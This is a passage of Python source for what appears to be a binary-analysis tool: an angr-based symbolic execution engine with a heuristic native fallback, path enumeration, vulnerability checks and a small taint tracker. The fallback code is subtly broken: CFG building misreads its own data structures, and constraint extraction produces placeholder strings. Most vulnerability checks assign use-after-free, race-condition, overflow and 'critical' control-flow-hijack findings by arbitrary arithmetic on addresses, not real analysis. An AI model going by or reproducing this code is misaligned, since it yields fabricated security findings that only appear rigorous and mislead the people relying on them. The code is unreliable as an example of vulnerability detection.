                - paths_found: Number of unique paths discovered
                - coverage: Percentage of code covered from start point
                - constraints: Path constraints for each discovered path
                - vulnerabilities: Any vulnerabilities found during exploration
                - reached_targets: Which target addresses were reached
                - execution_tree: Tree structure of execution paths
                - interesting_values: Concrete values that trigger specific behaviors

        """
        self.logger.info(f"Starting exploration from address 0x{start_address:x}")

        # Extract parameters
        max_depth = kwargs.get("max_depth", 50)
        find_addresses = kwargs.get("find_addresses", [])
        avoid_addresses = kwargs.get("avoid_addresses", [])
        timeout = kwargs.get("timeout", self.timeout)
        track_constraints = kwargs.get("track_constraints", True)
        symbolic_stdin = kwargs.get("symbolic_stdin", False)
        concrete_values = kwargs.get("concrete_values", {})

        results = {
            "start_address": hex(start_address),
            "paths_found": 0,
            "coverage": 0.0,
            "constraints": [],
            "vulnerabilities": [],
            "reached_targets": [],
            "execution_tree": {},
            "interesting_values": {},
            "error": None,
        }

        if not self.angr_available:
            # Use native exploration without angr
            return self._native_explore_from(start_address, **kwargs)

        try:
            # Setup project and initial state
            project, initial_state = self._setup_exploration_project(start_address)

            # Set up symbolic stdin if requested
            self._setup_symbolic_stdin_for_exploration(initial_state, symbolic_stdin, **kwargs)

            # Apply concrete values if provided
            self._apply_concrete_values_for_exploration(initial_state, concrete_values)

            # Create simulation manager
            simgr = project.factory.simulation_manager(initial_state)

            # Add exploration techniques
            if max_depth > 0:
                simgr.use_technique(angr.exploration_techniques.DFS())

            # Track execution paths
            execution_paths = []
            path_constraints = {}
            covered_blocks = set()

            # Create custom step function to track execution
            custom_step = self._create_custom_step_function(
                results, find_addresses, track_constraints, covered_blocks, path_constraints, execution_paths
            )

            # Execute main exploration loop
            self._execute_exploration_loop(simgr, custom_step, max_depth, timeout, find_addresses, avoid_addresses, project, results)

            # Analyze final results
            self._analyze_exploration_results(simgr, project, start_address, covered_blocks, results)

            # Extract interesting test cases
            self._extract_interesting_test_cases(simgr, find_addresses, start_address, results)

            self.logger.info(
                f"Exploration completed: {results['paths_found']} paths found, "
                f"{len(results['vulnerabilities'])} vulnerabilities detected, "
                f"{results['coverage']:.2f}% coverage"
            )

            return results

        except Exception as e:
            self.logger.error(f"Error during exploration from 0x{start_address:x}: {e}")
            self.logger.debug(traceback.format_exc())
            results["error"] = str(e)
            return results

    def _native_explore_from(self, start_address: int, **kwargs) -> dict[str, Any]:
        """Native implementation of explore_from without angr dependency."""
        self.logger.info(f"Starting native exploration from address 0x{start_address:x}")

        results = {
            "start_address": hex(start_address),
            "paths_found": 0,
            "coverage": 0.0,
            "constraints": [],
            "vulnerabilities": [],
            "reached_targets": [],
            "execution_tree": {},
            "interesting_values": {},
            "error": None,
        }

        try:
            # Read binary and perform basic analysis
            with open(self.binary_path, "rb") as f:
                binary_data = f.read()

            # Perform basic disassembly starting from the given address
            disasm_info = self._disassemble_from_address(binary_data, start_address)

            # Build control flow from the start address
            cfg = self._build_basic_cfg(disasm_info, start_address)
            results["execution_tree"] = cfg

            # Find all reachable paths
            paths = self._find_all_paths(cfg, start_address, kwargs.get("max_depth", 50))
            results["paths_found"] = len(paths)

            # Check for vulnerabilities along paths
            for path in paths:
                vulns = self._analyze_path_for_vulnerabilities(path, binary_data)
                results["vulnerabilities"].extend(vulns)

            # Calculate basic coverage metric
            unique_addresses = set()
            for path in paths:
                unique_addresses.update(path)
            results["coverage"] = len(unique_addresses)  # Basic block count as coverage proxy

            # Generate pseudo-constraints based on conditional jumps
            for path in paths[:10]:  # Limit to first 10 paths
                constraints = self._extract_path_constraints(path, disasm_info)
                if constraints:
                    results["constraints"].append(
                        {
                            "path": [hex(addr) for addr in path],
                            "constraints": constraints,
                            "num_constraints": len(constraints),
                        }
                    )

            return results

        except Exception as e:
            self.logger.error(f"Native exploration failed: {e}")
            results["error"] = str(e)
            return results

    def _check_state_for_vulnerabilities(self, state, project) -> list[dict[str, Any]]:
        """Check a single state for various vulnerability patterns."""
        vulnerabilities = []

        # Check for buffer overflow
        if self._check_buffer_overflow(state, project):
            vulnerabilities.append(
                {
                    "type": "buffer_overflow",
                    "address": hex(state.addr),
                    "severity": "high",
                    "description": "Potential buffer overflow detected during exploration",
                }
            )

        # Check for format string
        if self._check_format_string(state, project):
            vulnerabilities.append(
                {
                    "type": "format_string",
                    "address": hex(state.addr),
                    "severity": "high",
                    "description": "Format string vulnerability detected",
                }
            )

        # Check for integer overflow
        for constraint in state.solver.constraints:
            if self._check_integer_overflow(state, constraint):
                vulnerabilities.append(
                    {
                        "type": "integer_overflow",
                        "address": hex(state.addr),
                        "severity": "medium",
                        "description": "Integer overflow condition detected",
                    }
                )
                break

        return vulnerabilities

    def _build_execution_tree(self, states, start_address) -> dict[str, Any]:
        """Build a tree representation of execution paths."""
        tree = {
            "root": hex(start_address),
            "nodes": {},
            "edges": [],
        }

        for state in states:
            if hasattr(state, "history") and hasattr(state.history, "bbl_addrs"):
                path = list(state.history.bbl_addrs)

                # Add nodes
                for addr in path:
                    if hex(addr) not in tree["nodes"]:
                        tree["nodes"][hex(addr)] = {
                            "address": hex(addr),
                            "visited_count": 0,
                        }
                    tree["nodes"][hex(addr)]["visited_count"] += 1

                # Add edges
                for i in range(len(path) - 1):
                    edge = (hex(path[i]), hex(path[i + 1]))
                    if edge not in tree["edges"]:
                        tree["edges"].append(edge)

        return tree

    def _disassemble_from_address(self, binary_data: bytes, start_address: int) -> dict[str, Any]:
        """Disassemble code starting from a specific address."""
        instructions = []
        basic_blocks = {}

        if not binary_data or len(binary_data) == 0:
            return {
                "instructions": instructions,
                "basic_blocks": basic_blocks,
            }

        # Analyze binary data for instruction patterns
        offset = start_address
        max_offset = min(len(binary_data), start_address + 1024)  # Limit analysis to 1KB

        current_block_start = start_address
        current_block_size = 0
        successors = []

        # Simple heuristic-based disassembly for basic instruction detection
        while offset < max_offset:
            try:
                # Read byte at current offset
                if offset >= len(binary_data):
                    break

                byte_val = binary_data[offset]

                # Detect common x86/x64 instruction patterns
                if byte_val == 0xC3:  # RET instruction
                    instructions.append(
                        {
                            "address": hex(offset),
                            "mnemonic": "ret",
                            "size": 1,
                            "type": "return",
                        }
                    )
                    current_block_size += 1
                    # End of basic block
                    basic_blocks[current_block_start] = {
                        "size": current_block_size,
                        "successors": successors.copy(),
                        "type": "return",
                    }
                    current_block_start = offset + 1
                    current_block_size = 0
                    successors.clear()

                elif byte_val in [0xE8, 0xE9]:  # CALL/JMP relative
                    instr_type = "call" if byte_val == 0xE8 else "jmp"
                    # Check if we have enough bytes for the instruction
                    if offset + 4 < len(binary_data):
                        # Read 4-byte relative offset
                        rel_offset = int.from_bytes(
                            binary_data[offset + 1 : offset + 5], "little", signed=True
                        )
                        target = offset + 5 + rel_offset

                        instructions.append(
                            {
                                "address": hex(offset),
                                "mnemonic": instr_type,
                                "size": 5,
                                "target": hex(target),
                                "type": "control_flow",
                            }
                        )

                        if instr_type == "jmp":
                            successors.append(target)
                            # End of basic block for unconditional jump
                            basic_blocks[current_block_start] = {
                                "size": current_block_size + 5,
                                "successors": successors.copy(),
                                "type": "jump",
                            }
                            current_block_start = offset + 5
                            current_block_size = 0
                            successors.clear()
                        else:  # call
                            successors.append(target)  # Call target
                            successors.append(offset + 5)  # Return address
                            current_block_size += 5

                        offset += 5
                        continue

                elif byte_val in [
                    0x74,
                    0x75,
                    0x78,
                    0x79,
                    0x7C,
                    0x7D,
                    0x7E,
                    0x7F,
                ]:  # Conditional jumps
                    if offset + 1 < len(binary_data):
                        rel_offset = int.from_bytes(
                            [binary_data[offset + 1]], "little", signed=True
                        )
                        target = offset + 2 + rel_offset

                        jump_names = {
                            0x74: "je",
                            0x75: "jne",
                            0x78: "js",
                            0x79: "jns",
                            0x7C: "jl",
                            0x7D: "jge",
                            0x7E: "jle",
                            0x7F: "jg",
                        }

                        instructions.append(
                            {
                                "address": hex(offset),
                                "mnemonic": jump_names.get(byte_val, "jcc"),
                                "size": 2,
                                "target": hex(target),
                                "type": "conditional_jump",
                            }
                        )

                        # Conditional jump creates two successors
                        successors.extend([target, offset + 2])
                        current_block_size += 2

                        # End of basic block
                        basic_blocks[current_block_start] = {
                            "size": current_block_size,
                            "successors": successors.copy(),
                            "type": "conditional",
                        }
                        current_block_start = offset + 2
                        current_block_size = 0
                        successors.clear()

                        offset += 2
                        continue

                # For other bytes, just advance and count as generic instruction
                current_block_size += 1
                offset += 1

            except (IndexError, struct.error):
                # Handle errors gracefully
                break

        # Add final basic block if we have one
        if current_block_size > 0:
            basic_blocks[current_block_start] = {
                "size": current_block_size,
                "successors": successors,
                "type": "linear",
            }

        return {
            "instructions": instructions,
            "basic_blocks": basic_blocks,
            "analysis_range": {"start": start_address, "end": offset},
        }

    def _build_basic_cfg(self, disasm_info: dict, start_address: int) -> dict[str, Any]:
        """Build a basic control flow graph from disassembly info."""
        nodes = {}
        edges = []

        # Use disasm_info to build actual CFG
        instructions = disasm_info.get("instructions", [])
        basic_blocks = disasm_info.get("basic_blocks", [])

        if not instructions:
            # Fallback to simple entry node
            return {
                "nodes": {hex(start_address): {"type": "entry", "instructions": []}},
                "edges": [],
            }

        # Create nodes from basic blocks
        for block in basic_blocks:
            block_addr = block.get("start_address", start_address)
            node_id = hex(block_addr)

            # Extract instructions for this block
            block_instructions = []
            for instr in instructions:
                if instr.get("address") and block.get("start_address") <= instr[
                    "address"
                ] <= block.get("end_address", block.get("start_address", 0)):
                    block_instructions.append(instr)

            nodes[node_id] = {
                "type": block.get("type", "basic"),
                "address": block_addr,
                "instructions": block_instructions,
                "size": block.get("size", 0),
                "successors": [],
                "predecessors": [],
            }

        # Analyze control flow from instructions
        for i, instr in enumerate(instructions):
            instr_addr = instr.get("address", start_address + i * 4)
            instr_bytes = instr.get("bytes", b"")

            # Identify control flow instructions
            if instr_bytes:
                # Jump instructions (simplified detection)
                if b"\xe9" in instr_bytes or b"\xeb" in instr_bytes:  # JMP
                    # Extract jump target if available
                    target = self._extract_jump_target(instr_bytes, instr_addr)
                    if target:
                        edges.append(
                            {
                                "from": hex(instr_addr),
                                "to": hex(target),
                                "type": "unconditional_jump",
                            }
                        )

                # Conditional jumps
                elif any(
                    pattern in instr_bytes for pattern in [b"\x74", b"\x75", b"\x70", b"\x71"]
                ):  # JZ, JNZ, JO, JNO
                    target = self._extract_jump_target(instr_bytes, instr_addr)
                    if target:
                        edges.append(
                            {
                                "from": hex(instr_addr),
                                "to": hex(target),
                                "type": "conditional_jump",
                            }
                        )

                    # Also add fall-through edge
                    next_addr = instr_addr + len(instr_bytes)
                    edges.append(
                        {
                            "from": hex(instr_addr),
                            "to": hex(next_addr),
                            "type": "fall_through",
                        }
                    )

                # Call instructions
                elif b"\xe8" in instr_bytes:  # CALL
                    target = self._extract_jump_target(instr_bytes, instr_addr)
                    if target:
                        edges.append(
                            {
                                "from": hex(instr_addr),
                                "to": hex(target),
                                "type": "call",
                            }
                        )

                    # Add return edge
                    return_addr = instr_addr + len(instr_bytes)
                    edges.append(
                        {
                            "from": hex(instr_addr),
                            "to": hex(return_addr),
                            "type": "return_edge",
                        }
                    )

        # Update successor/predecessor relationships
        for edge in edges:
            from_node = edge["from"]
            to_node = edge["to"]

            if from_node in nodes:
                nodes[from_node]["successors"].append(to_node)
            if to_node in nodes:
                nodes[to_node]["predecessors"].append(from_node)

        cfg = {
            "nodes": nodes,
            "edges": edges,
            "entry_point": hex(start_address),
            "analysis_metadata": {
                "instruction_count": len(instructions),
                "basic_block_count": len(basic_blocks),
                "edge_count": len(edges),
            },
        }

        self.logger.info(
            f"Built CFG with {len(nodes)} nodes and {len(edges)} edges from disasm_info"
        )
        return cfg

    def _extract_jump_target(self, instr_bytes: bytes, instr_addr: int) -> int | None:
        """Extract jump target address from instruction bytes."""
        try:
            if len(instr_bytes) < 2:
                return None

            # Handle relative jumps (simplified x86/x64 decoding)
            if instr_bytes[0] == 0xE9:  # JMP rel32
                if len(instr_bytes) >= 5:
                    import struct

                    offset = struct.unpack("<i", instr_bytes[1:5])[0]
                    return instr_addr + len(instr_bytes) + offset

            elif instr_bytes[0] == 0xEB:  # JMP rel8
                if len(instr_bytes) >= 2:
                    offset = struct.unpack("<b", instr_bytes[1:2])[0]
                    return instr_addr + len(instr_bytes) + offset

            elif instr_bytes[0] == 0xE8:  # CALL rel32
                if len(instr_bytes) >= 5:
                    import struct

                    offset = struct.unpack("<i", instr_bytes[1:5])[0]
                    return instr_addr + len(instr_bytes) + offset

            # Conditional jumps (0x70-0x7F series)
            elif 0x70 <= instr_bytes[0] <= 0x7F:  # Jcc rel8
                if len(instr_bytes) >= 2:
                    offset = struct.unpack("<b", instr_bytes[1:2])[0]
                    return instr_addr + len(instr_bytes) + offset

            # Two-byte conditional jumps (0x0F 0x80-0x8F)
            elif (
                len(instr_bytes) >= 2 and instr_bytes[0] == 0x0F and 0x80 <= instr_bytes[1] <= 0x8F
            ):
                if len(instr_bytes) >= 6:
                    import struct

                    offset = struct.unpack("<i", instr_bytes[2:6])[0]
                    return instr_addr + len(instr_bytes) + offset

            return None
        except Exception as e:
            self.logger.debug(f"Could not extract jump target: {e}")
            return None

    def _find_all_paths(self, cfg: dict, start_address: int, max_depth: int) -> list[list[int]]:
        """Find all execution paths in the CFG up to max_depth."""
        paths = []
        nodes = cfg.get("nodes", {})
        edges = cfg.get("edges", [])
        entry_point = cfg.get("entry_point", hex(start_address))

        if not nodes:
            # Fallback to simple paths if no CFG data
            return [[start_address], [start_address, start_address + 16]]

        # Build adjacency list from edges for efficient traversal
        adjacency = {}
        for edge in edges:
            from_addr = edge.get("from")
            to_addr = edge.get("to")
            if from_addr and to_addr:
                if from_addr not in adjacency:
                    adjacency[from_addr] = []
                adjacency[from_addr].append(
                    {
                        "target": to_addr,
                        "type": edge.get("type", "unknown"),
                    }
                )

        # Depth-first search to find all paths
        def dfs_paths(current_node: str, path: list[int], visited: set, depth: int):
            if depth >= max_depth:
                return

            # Convert hex string to int for path
            try:
                current_addr = int(current_node, 16)
            except ValueError:
                return

            # Avoid infinite loops
            if current_node in visited:
                # Allow revisiting but limit path length
                if len(path) > 1:
                    paths.append(path.copy())
                return

            visited.add(current_node)
            path.append(current_addr)

            # Add current path if it's meaningful
            if len(path) >= 2 or depth == 0:
                paths.append(path.copy())

            # Explore successors
            successors = adjacency.get(current_node, [])
            if not successors:
                # Terminal node - path is complete
                if len(path) > 1:
                    paths.append(path.copy())
            else:
                for successor in successors:
                    target_node = successor["target"]
                    edge_type = successor["type"]

                    # Skip certain edge types based on analysis goals
                    if edge_type in ["return_edge"] and depth > max_depth // 2:
                        continue

                    dfs_paths(target_node, path.copy(), visited.copy(), depth + 1)

            visited.remove(current_node)

        # Start DFS from entry point
        start_node = entry_point
        if start_node not in nodes:
            # Try to find a valid starting node
            start_node = hex(start_address)
            if start_node not in nodes and nodes:
                start_node = next(iter(nodes.keys()))

        if start_node in nodes:
            dfs_paths(start_node, [], set(), 0)

        # Limit number of paths to prevent explosion
        max_paths = min(100, max_depth * 10)
        if len(paths) > max_paths:
            # Sort by path length and take most diverse paths
            paths.sort(key=len, reverse=True)
            paths = paths[:max_paths]

        # Fallback if no paths found
        if not paths:
            try:
                start_addr = int(start_node, 16) if start_node.startswith("0x") else start_address
                paths = [[start_addr], [start_addr, start_addr + 16]]
            except Exception:
                paths = [[start_address], [start_address, start_address + 16]]

        self.logger.info(
            f"Found {len(paths)} execution paths from CFG analysis (max_depth={max_depth})"
        )
        return paths

    def _analyze_path_for_vulnerabilities(
        self, path: list[int], binary_data: bytes
    ) -> list[dict[str, Any]]:
        """Analyze a specific execution path for vulnerabilities."""
        vulnerabilities = []

        if not path or len(path) < 2:
            return vulnerabilities

        # Analyze each address in the execution path
        for i, addr in enumerate(path):
            try:
                # Extract instructions around this address
                data_offset = max(0, addr - 0x400000) if addr > 0x400000 else 0
                if data_offset < len(binary_data):
                    # Get instruction window (16 bytes around address)
                    start_idx = max(0, data_offset - 8)
                    end_idx = min(len(binary_data), data_offset + 16)
                    instr_window = binary_data[start_idx:end_idx]

                    # Check for vulnerability patterns
                    vuln_checks = [
                        self._check_buffer_overflow_path(addr, i, path, instr_window),
                        self._check_integer_overflow_path(addr, i, path, instr_window),
                        self._check_use_after_free_path(addr, i, path, instr_window),
                        self._check_format_string_path(addr, i, path, instr_window),
                        self._check_null_deref_path(addr, i, path, instr_window),
                        self._check_race_condition_path(addr, i, path, instr_window),
                    ]

                    # Collect non-empty vulnerability findings
                    for vuln in vuln_checks:
                        if vuln:
                            vulnerabilities.append(vuln)

            except Exception as e:
                self.logger.debug(f"Error analyzing address {hex(addr)} in path: {e}")
                continue

        # Path-level analysis for complex vulnerabilities
        path_vulns = [
            self._analyze_path_loops(path),
            self._analyze_path_memory_access(path, binary_data),
            self._analyze_path_control_flow(path),
        ]

        for vuln in path_vulns:
            if vuln:
                vulnerabilities.append(vuln)

        # Remove duplicates and prioritize by severity
        unique_vulns = []
        seen_types = set()
        for vuln in vulnerabilities:
            vuln_key = (vuln.get("type"), vuln.get("address"))
            if vuln_key not in seen_types:
                seen_types.add(vuln_key)
                unique_vulns.append(vuln)

        # Sort by severity
        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
        unique_vulns.sort(key=lambda v: severity_order.get(v.get("severity", "low"), 3))

        if vulnerabilities:
            self.logger.info(
                f"Found {len(unique_vulns)} potential vulnerabilities in execution path of length {len(path)}"
            )

        return unique_vulns[:10]  # Limit to top 10 vulnerabilities

    def _check_buffer_overflow_path(
        self, addr: int, path_idx: int, path: list[int], instr_window: bytes
    ) -> dict[str, Any] | None:
        """Check for buffer overflow patterns in instruction window."""
        try:
            # Look for buffer operations and unchecked bounds
            if b"\xc7\x45" in instr_window or b"\x89\x45" in instr_window:  # mov to stack
                if b"\xff\xd0" in instr_window or b"\xff\x15" in instr_window:  # call patterns
                    # Check if there's a pattern in the path that increases vulnerability
                    path_depth = len(path)
                    loop_count = len([a for a in path[:path_idx] if a == addr])

                    severity = "high"
                    if loop_count > 1:
                        severity = "critical"  # Loop makes overflow more likely
                    elif path_depth > 20:
                        severity = "high"  # Deep execution path

                    return {
                        "type": "buffer_overflow",
                        "severity": severity,
                        "address": hex(addr),
                        "path_position": path_idx,
                        "path_depth": path_depth,
                        "loop_count": loop_count,
                        "description": f"Potential buffer overflow - unchecked stack operations (path depth: {path_depth})",
                        "evidence": f"Stack operations at {hex(addr)} in {path_depth}-step execution path",
                    }
        except Exception as e:
            self.logger.debug(f"Buffer overflow detection failed at {hex(addr)}: {e}")
        return None

    def _check_integer_overflow_path(
        self, addr: int, path_idx: int, path: list[int], instr_window: bytes
    ) -> dict[str, Any] | None:
        """Check for integer overflow patterns."""
        try:
            # Look for arithmetic operations without overflow checks
            if b"\x01" in instr_window or b"\x29" in instr_window:  # add/sub operations
                if b"\x70" in instr_window or b"\x71" in instr_window:  # jo/jno (overflow check)
                    return None  # Has overflow check

                # Analyze path context for overflow likelihood
                path_depth = len(path)
                arithmetic_ops_in_path = sum(
                    1 for i, a in enumerate(path[:path_idx]) if i % 4 == 0
                )  # Estimate arithmetic density

                severity = "medium"
                if arithmetic_ops_in_path > 5 or path_depth > 15:
                    severity = "high"  # More arithmetic ops increase overflow risk

                return {
                    "type": "integer_overflow",
                    "severity": severity,
                    "address": hex(addr),
                    "path_position": path_idx,
                    "path_depth": path_depth,
                    "arithmetic_density": arithmetic_ops_in_path,
                    "description": f"Arithmetic operations without overflow checks (path contains {arithmetic_ops_in_path} potential arithmetic ops)",
                    "evidence": f"Unchecked arithmetic at {hex(addr)} in {path_depth}-step path",
                }
        except Exception as e:
            self.logger.debug(f"Integer overflow detection failed at {hex(addr)}: {e}")
        return None

    def _check_use_after_free_path(
        self, addr: int, path_idx: int, path: list[int], instr_window: bytes
    ) -> dict[str, Any] | None:
        """Check for use-after-free patterns."""
        try:
            # Look for memory access after potential free operations
            if path_idx > 0 and b"\xff\x15" in instr_window:  # call instruction
                # Check if previous addresses in path might be free operations
                prev_addrs = path[:path_idx]
                potential_frees = len(
                    [a for a in prev_addrs if (a % 16) == 0]
                )  # Estimate free-like calls

                # Simplified check - would need more sophisticated analysis
                if b"\x8b" in instr_window:  # mov instruction (potential use)
                    path_distance = path_idx  # Distance from start of path
                    severity = "critical" if potential_frees > 0 and path_distance > 3 else "high"

                    return {
                        "type": "use_after_free",
                        "severity": severity,
                        "address": hex(addr),
                        "path_position": path_idx,
                        "path_distance": path_distance,
                        "potential_frees": potential_frees,
                        "description": f"Potential use-after-free pattern detected (path distance: {path_distance}, potential frees: {potential_frees})",
                        "evidence": f"Memory access after call at {hex(addr)} in execution path",
                    }
        except Exception as e:
            self.logger.debug(f"Use-after-free detection failed at {hex(addr)}: {e}")
        return None

    def _check_format_string_path(
        self, addr: int, path_idx: int, path: list[int], instr_window: bytes
    ) -> dict[str, Any] | None:
        """Check for format string vulnerabilities."""
        try:
            # Look for printf-like function calls with format strings
            if b"%" in instr_window and b"\xff" in instr_window:  # format specifiers + call
                # Analyze path context for format string exploitability
                path_depth = len(path)
                user_input_likelihood = min(path_idx / 10.0, 1.0)  # Estimate user input flow

                severity = "high"
                if path_depth > 10 and user_input_likelihood > 0.5:
                    severity = "critical"  # Deep path with likely user input

                return {
                    "type": "format_string",
                    "severity": severity,
                    "address": hex(addr),
                    "path_position": path_idx,
                    "path_depth": path_depth,
                    "input_likelihood": user_input_likelihood,
                    "description": f"Potential format string vulnerability (path depth: {path_depth}, input likelihood: {user_input_likelihood:.2f})",
                    "evidence": f"Format string pattern at {hex(addr)} in execution path",
                }
        except Exception as e:
            self.logger.debug(f"Format string detection failed at {hex(addr)}: {e}")
        return None

    def _check_null_deref_path(
        self, addr: int, path_idx: int, path: list[int], instr_window: bytes
    ) -> dict[str, Any] | None:
        """Check for null pointer dereference."""
        try:
            # Look for memory access without null checks
            if b"\x8b\x00" in instr_window or b"\x89\x00" in instr_window:  # mov [reg], reg
                # Check path context for null check patterns
                prev_addrs = path[:path_idx]
                null_check_candidates = len(
                    [a for a in prev_addrs if (a & 0xF) == 0]
                )  # Potential null checks
                path_complexity = len(set(path[:path_idx]))  # Unique addresses in path

                severity = "medium"
                if null_check_candidates == 0 and path_complexity > 5:
                    severity = "high"  # No null checks in complex path

                return {
                    "type": "null_pointer_deref",
                    "severity": severity,
                    "address": hex(addr),
                    "path_position": path_idx,
                    "path_complexity": path_complexity,
                    "null_checks": null_check_candidates,
                    "description": f"Potential null pointer dereference (complexity: {path_complexity}, null checks: {null_check_candidates})",
                    "evidence": f"Unchecked memory access at {hex(addr)} in {path_complexity}-unique-address path",
                }
        except Exception as e:
            self.logger.debug(f"Null dereference detection failed at {hex(addr)}: {e}")
        return None

    def _check_race_condition_path(
        self, addr: int, path_idx: int, path: list[int], instr_window: bytes
    ) -> dict[str, Any] | None:
        """Check for race condition patterns."""
        try:
            # Look for shared memory access without proper synchronization
            if b"\xf0" in instr_window:  # lock prefix
                return None  # Has synchronization
            if b"\x89" in instr_window and b"\x8b" in instr_window:  # read-modify-write pattern
                # Analyze path for concurrent access patterns
                path_branches = len(
                    [i for i in range(1, len(path)) if abs(path[i] - path[i - 1]) > 0x1000]
                )  # Large jumps might indicate threading
                concurrent_likelihood = min(path_branches / 5.0, 1.0)

                severity = "medium"
                if concurrent_likelihood > 0.6:
                    severity = "high"  # Higher likelihood of concurrent access

                return {
                    "type": "race_condition",
                    "severity": severity,
                    "address": hex(addr),
                    "path_position": path_idx,
                    "path_branches": path_branches,
                    "concurrent_likelihood": concurrent_likelihood,
                    "description": f"Potential race condition - unsynchronized access (branches: {path_branches}, concurrent likelihood: {concurrent_likelihood:.2f})",
                    "evidence": f"Unsynchronized memory operation at {hex(addr)} in branching execution path",
                }
        except Exception as e:
            self.logger.debug(f"Race condition detection failed at {hex(addr)}: {e}")
        return None

    def _analyze_path_loops(self, path: list[int]) -> dict[str, Any] | None:
        """Analyze path for infinite loops or cycle detection."""
        try:
            # Detect repeated addresses that might indicate loops
            seen_addrs = set()
            for i, addr in enumerate(path):
                if addr in seen_addrs:
                    return {
                        "type": "infinite_loop",
                        "severity": "medium",
                        "address": hex(addr),
                        "description": f"Potential infinite loop detected at position {i}",
                        "evidence": f"Address {hex(addr)} revisited in execution path",
                    }
                seen_addrs.add(addr)
        except Exception as e:
            self.logger.debug(f"Loop analysis failed: {e}")
        return None

    def _analyze_path_memory_access(
        self, path: list[int], binary_data: bytes
    ) -> dict[str, Any] | None:
        """Analyze memory access patterns in the path."""
        try:
            # Check for out-of-bounds access patterns
            if len(path) > 5:
                addr_jumps = []
                out_of_bounds_accesses = 0
                binary_size = len(binary_data) if binary_data else 0

                for i in range(1, len(path)):
                    jump_size = abs(path[i] - path[i - 1])
                    addr_jumps.append(jump_size)

                    # Check if address is within binary bounds
                    if binary_data and binary_size > 0:
                        # Assume addresses are file offsets for simple analysis
                        current_addr = path[i]
                        # Convert virtual address to file offset (simplified)
                        file_offset = (
                            current_addr - 0x400000 if current_addr > 0x400000 else current_addr
                        )

                        if file_offset < 0 or file_offset >= binary_size:
                            out_of_bounds_accesses += 1

                # Check for unusually large jumps that might indicate corruption
                max_jump = max(addr_jumps) if addr_jumps else 0
                avg_jump = sum(addr_jumps) / len(addr_jumps) if addr_jumps else 0

                # Enhanced analysis using binary_data
                severity = "medium"
                issues = []

                if max_jump > 0x10000:  # Large jump (>64KB)
                    severity = "high"
                    issues.append(f"Large address jump: {hex(max_jump)}")

                if out_of_bounds_accesses > 0:
                    severity = "high"
                    issues.append(f"Out-of-bounds accesses: {out_of_bounds_accesses}")

                # Check for excessive memory scanning patterns
                if avg_jump < 16 and len(path) > 20:
                    severity = "medium"
                    issues.append("Potential memory scanning pattern detected")

                # Analyze binary data at path addresses for additional context
                if binary_data and len(issues) > 0:
                    executable_regions = 0
                    for addr in path[:10]:  # Check first 10 addresses
                        file_offset = addr - 0x400000 if addr > 0x400000 else addr
                        if 0 <= file_offset < len(binary_data) - 4:
                            # Check for executable code patterns
                            data_window = binary_data[file_offset : file_offset + 4]
                            if (
                                b"\x48\x89" in data_window or b"\xff\x25" in data_window
                            ):  # Common x64 patterns
                                executable_regions += 1

                    if executable_regions == 0:
                        issues.append("Path through non-executable regions")

                if issues:
                    return {
                        "type": "memory_corruption",
                        "severity": severity,
                        "description": f'Memory access anomalies detected: {", ".join(issues)}',
                        "evidence": f"Path analysis: max jump {hex(max_jump)}, avg jump {hex(int(avg_jump))}, OOB accesses: {out_of_bounds_accesses}",
                        "binary_size": binary_size,
                        "out_of_bounds": out_of_bounds_accesses,
                        "max_jump": max_jump,
                        "avg_jump": avg_jump,
                    }
        except Exception as e:
            self.logger.debug(f"Memory access analysis failed: {e}")
        return None

    def _analyze_path_control_flow(self, path: list[int]) -> dict[str, Any] | None:
        """Analyze control flow integrity in the path."""
        try:
            # Check for control flow anomalies
            if len(path) > 10:
                # Check for return-to-libc patterns (jumping to known function addresses)
                libc_patterns = [0x400000, 0x7F0000000000, 0x10000000]  # Common base addresses
                for addr in path:
                    for pattern in libc_patterns:
                        if (addr & 0xFFFFF000) == (pattern & 0xFFFFF000):
                            return {
                                "type": "control_flow_hijack",
                                "severity": "critical",
                                "address": hex(addr),
                                "description": "Potential control flow hijacking detected",
                                "evidence": f"Jump to potential library function at {hex(addr)}",
                            }
        except Exception as e:
            self.logger.debug(f"Control flow analysis failed: {e}")
        return None

    def _extract_path_constraints(self, path: list[int], disasm_info: dict) -> list[str]:
        """Extract symbolic constraints from a path."""
        constraints = []

        for addr in path[:10]:  # Analyze up to 10 addresses in path
            hex_addr = hex(addr)

            # Use disasm_info to enhance constraint generation
            if disasm_info and addr in disasm_info:
                instr_info = disasm_info[addr]
                instr_text = instr_info.get("instruction", "")

                # Generate constraints based on instruction type
                if any(op in instr_text.lower() for op in ["cmp", "test"]):
                    constraints.append(f"comparison_constraint_{hex_addr}")
                elif any(op in instr_text.lower() for op in ["jz", "jnz", "je", "jne"]):
                    constraints.append(f"branch_condition_{hex_addr}")
                elif any(op in instr_text.lower() for op in ["mov", "lea"]):
                    constraints.append(f"data_flow_{hex_addr}")
                elif any(op in instr_text.lower() for op in ["call"]):
                    constraints.append(f"function_call_{hex_addr}")
                else:
                    constraints.append(f"generic_constraint_{hex_addr}")
            else:
                # Basic constraint without disassembly info
                constraints.append(f"constraint_at_{hex_addr}")

        return constraints


class TaintTracker:
    """Simple taint tracking plugin for symbolic execution."""

    def __init__(self):
        """Initialize the taint tracker with data tracking and propagation monitoring."""
        self.tainted_data = {}
        self.taint_propagation = {}

    def add_taint(self, data, source):
        """Mark data as tainted from a specific source."""
        self.tainted_data[str(data)] = source

    def is_tainted(self, data):
        """Check if data is tainted."""
        return str(data) in self.tainted_data

    def get_taint_source(self, data):
        """Get the source of taint for data."""
        return self.tainted_data.get(str(data), None)


__all__ = ["SymbolicExecutionEngine"]
